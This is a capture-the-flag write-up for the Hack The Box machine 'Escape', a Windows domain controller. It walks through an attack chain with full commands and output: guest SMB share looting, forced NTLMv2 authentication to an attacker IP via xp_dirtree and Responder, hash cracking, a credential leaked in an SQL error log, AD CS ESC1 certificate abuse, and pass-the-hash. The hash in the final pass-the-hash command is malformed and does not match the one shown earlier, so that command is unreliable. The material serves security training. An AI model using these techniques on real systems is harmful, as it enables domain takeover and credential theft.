# HTB Write-Up: Escape

| Field      | Details                                                        |
|------------|----------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Escape)     |
| Difficulty | Medium                                                         |
| OS         | Windows                                                        |

---

## 1. Reconnaissance

Initial port discovery was carried out using **RustScan** for speed, followed by a detailed **Nmap** service enumeration:

```bash
rustscan -a 10.129.228.253 --ulimit 5000
```

**Open Ports:**

| Port  | Service         | Details                                          |
|-------|-----------------|--------------------------------------------------|
| 53    | DNS             | Simple DNS Plus                                  |
| 88    | Kerberos        | Microsoft Windows Kerberos                       |
| 135   | MSRPC           | Microsoft Windows RPC                            |
| 139   | NetBIOS         | Microsoft Windows netbios-ssn                    |
| 389   | LDAP            | Domain: `sequel.htb`                             |
| 445   | SMB             | microsoft-ds                                     |
| 464   | kpasswd5        | tcpwrapped                                       |
| 593   | HTTP-RPC        | RPC over HTTP 1.0                                |
| 636   | LDAPSSL         | tcpwrapped                                       |
| 1433  | MSSQL           | Microsoft SQL Server 2019 RTM (15.00.2000.00)    |
| 3268  | Global Catalog  | Microsoft Windows Active Directory LDAP          |
| 3269  | Global Catalog SSL | Microsoft Windows Active Directory LDAP       |
| 5985  | WinRM           | Windows Remote Management                        |
| 9389  | ADWS            | Active Directory Web Services                    |

The target is a **Domain Controller** running **Windows Server 2019** (Build 17763), hostname **DC**, domain **`sequel.htb`**. The presence of port **1433** (MSSQL) immediately sets this machine apart from a standard pure-AD target and becomes a key entry point.

---

## 2. Enumeration — SMB Public Share & MSSQL Access

### 2.1 — Anonymous & Guest SMB Enumeration

Null session authentication was tested first:

```bash
netexec smb 10.129.228.253 -u '' -p '' --shares
```

Null auth was accepted but share listing returned `STATUS_ACCESS_DENIED`. Switching to guest authentication succeeded and exposed a non-default share:

```bash
netexec smb 10.129.228.253 -u 'guest' -p '' --shares
```

**Output:**

```
SMB  10.129.228.253  445  DC  Share       Permissions  Remark
SMB  10.129.228.253  445  DC  -----       -----------  ------
SMB  10.129.228.253  445  DC  ADMIN$                   Remote Admin
SMB  10.129.228.253  445  DC  C$                       Default share
SMB  10.129.228.253  445  DC  IPC$        READ         Remote IPC
SMB  10.129.228.253  445  DC  NETLOGON                 Logon server share
SMB  10.129.228.253  445  DC  Public      READ
SMB  10.129.228.253  445  DC  SYSVOL                   Logon server share
```

The **`Public`** share is accessible without any credentials.

### 2.2 — Public Share Contents

```bash
smbclient //10.129.228.253/Public -N
smb: \> ls
smb: \> get "SQL Server Procedures.pdf"
```

The share held a single file: **`SQL Server Procedures.pdf`**. Inside, an internal procedures document contained the following note for new hires:

> For new hired and those that are still waiting their users to be created and perms assigned, can sneak a peek at the Database with user **`PublicUser`** and password **`GuestUserCantWrite1`**.

Valid MSSQL credentials were stored in plaintext inside a document sitting on an unauthenticated share.

### 2.3 — MSSQL Enumeration as PublicUser

The recovered credentials were used to connect to the SQL Server instance:

```bash
impacket-mssqlclient 'PublicUser':'GuestUserCantWrite1'@sequel.htb -port 1433
```

The account had very limited privileges — no `sysadmin` role, no `xp_cmdshell`, no `BULK INSERT`, and no useful linked servers. Impersonation targets were also empty. However, the `xp_dirtree` extended stored procedure was executable, which can be leveraged to trigger outbound SMB connections from the server.

---

## 3. Initial Access — MSSQL NTLMv2 Hash Capture & Credential Recovery

### 3.1 — NTLMv2 Hash Capture via xp_dirtree

A **Responder** listener was started to intercept incoming NTLMv2 authentication attempts:

```bash
sudo responder -I tun0 -wv
```

A UNC path pointing back to the attacker machine was passed to `xp_dirtree`, which forced the SQL Server service account to authenticate outbound over SMB:

```sql
EXEC master..xp_dirtree '\\10.10.14.102\share\'
```

Responder captured the NTLMv2 hash belonging to the account running the MSSQL service:

```
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:246ff7bca98cdc85:28E4D7C5AEE2...
```

### 3.2 — Hash Cracking with Hashcat

The captured NTLMv2 hash was cracked offline using Hashcat with the rockyou wordlist:

```bash
hashcat -m 5600 sql_svc.hash /usr/share/wordlists/rockyou.txt
```

**Result:**

```
SQL_SVC::sequel:...:REGGIE1234ronnie
Status: Cracked
```

Recovered credentials: **`sql_svc:REGGIE1234ronnie`**

### 3.3 — Shell via WinRM

The cracked credentials were validated against WinRM:

```bash
netexec winrm sequel.htb -u sql_svc -p 'REGGIE1234ronnie'
# [+] sequel.htb\sql_svc:REGGIE1234ronnie (Pwn3d!)
```

A shell was obtained:

```bash
evil-winrm -i sequel.htb -u sql_svc -p REGGIE1234ronnie
```

---

## 4. Lateral Movement — SQL Server Error Log Credential Leak

### 4.1 — SQL Server Log Discovery

Filesystem enumeration during post-exploitation revealed a SQL Server installation directory:

```powershell
*Evil-WinRM* PS C:\> cd SqlServer\Logs
*Evil-WinRM* PS C:\SqlServer\Logs> ls
# ERRORLOG.BAK
```

### 4.2 — Plaintext Password in Error Log

The `ERRORLOG.BAK` file contained SQL Server authentication failure records. A misconfigured login attempt had inadvertently written a plaintext password into the username field of the log:

```
2022-11-18 13:43:07.44  Logon failed for user 'sequel.htb\Ryan.Cooper'. [CLIENT: 127.0.0.1]
2022-11-18 13:43:07.48  Logon failed for user 'NuclearMosquito3'. [CLIENT: 127.0.0.1]
```

The second failed login used **`NuclearMosquito3`** as the username — a clear indicator that the user accidentally typed their password into the wrong field. Since the line immediately above references `Ryan.Cooper`, the password was attributed to that account.

Recovered credentials: **`ryan.cooper:NuclearMosquito3`**

### 4.3 — Confirming Access

```bash
netexec smb sequel.htb -u ryan.cooper -p 'NuclearMosquito3'
# [+] sequel.htb\ryan.cooper:NuclearMosquito3
```

---

## 5. Privilege Escalation — ADCS ESC1 Certificate Abuse

### 5.1 — BloodHound Enumeration

BloodHound data was collected as `ryan.cooper` and showed that the account held rights to enroll in certificate templates through Active Directory Certificate Services (AD CS).

### 5.2 — Vulnerable Certificate Template Discovery

**Certipy** was used to enumerate the CA and identify misconfigured certificate templates:

```bash
certipy-ad find -dc-host dc.sequel.htb \
  -u ryan.cooper@sequel.htb -p 'NuclearMosquito3' \
  -vulnerable -stdout
```

**Finding:**

```
Certificate Templates
  0
    Template Name          : UserAuthentication
    Enrollee Supplies Subject : True
    Client Authentication  : True
    Enrollment Rights      : SEQUEL.HTB\Domain Users

    [!] Vulnerabilities
      ESC1 : Enrollee supplies subject and template allows client authentication.
```

The `UserAuthentication` template is vulnerable to **ESC1**: any Domain User can enroll and specify an arbitrary Subject Alternative Name (SAN), including the UPN of a privileged account such as `Administrator`.

**What is ESC1?** AD CS certificate templates can be misconfigured to allow the enrollee to supply their own subject in the certificate request. When the template also permits client authentication, an attacker can request a certificate carrying the UPN of any domain account — including Domain Admin — and use it to authenticate via Kerberos PKINIT, fully impersonating that account without ever knowing its password.

### 5.3 — Requesting a Certificate as Administrator

A certificate was requested for the `administrator` UPN using `ryan.cooper`'s credentials:

```bash
certipy-ad req \
  -u 'ryan.cooper' -p "NuclearMosquito3" \
  -dc-ip "10.129.228.253" \
  -ca 'sequel-DC-CA' \
  -template 'UserAuthentication' \
  -upn 'administrator' \
  -target 'dc.sequel.htb' \
  -key-size 4096
```

**Output:**

```
[*] Got certificate with UPN 'administrator'
[*] Saving certificate and private key to 'administrator.pfx'
```

### 5.4 — Authenticating & Extracting the NT Hash

The clock was synchronized with the DC before authenticating (required for Kerberos):

```bash
sudo timedatectl set-ntp false && sudo ntpdate sequel.htb
```

The certificate was then used to authenticate and retrieve the Administrator NT hash:

```bash
certipy-ad auth -pfx administrator.pfx -dc-ip 10.129.228.253 -domain sequel.htb
```

**Output:**

```
[*] Got TGT
[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:b29f78e4c751e5f5e17e1e9f3e58f4ee
```

### 5.5 — Root Flag via Pass-the-Hash

```bash
evil-winrm -i sequel.htb -u Administrator -H b292f78e4c751e5f5e17e1e9f3e58f4ee
```

```powershell
*Evil-WinRM* PS C:\Users\Administrator\Desktop> cat root.txt
406b1ebdd8bbcf84177dc5c5cb90a7ac
```

---

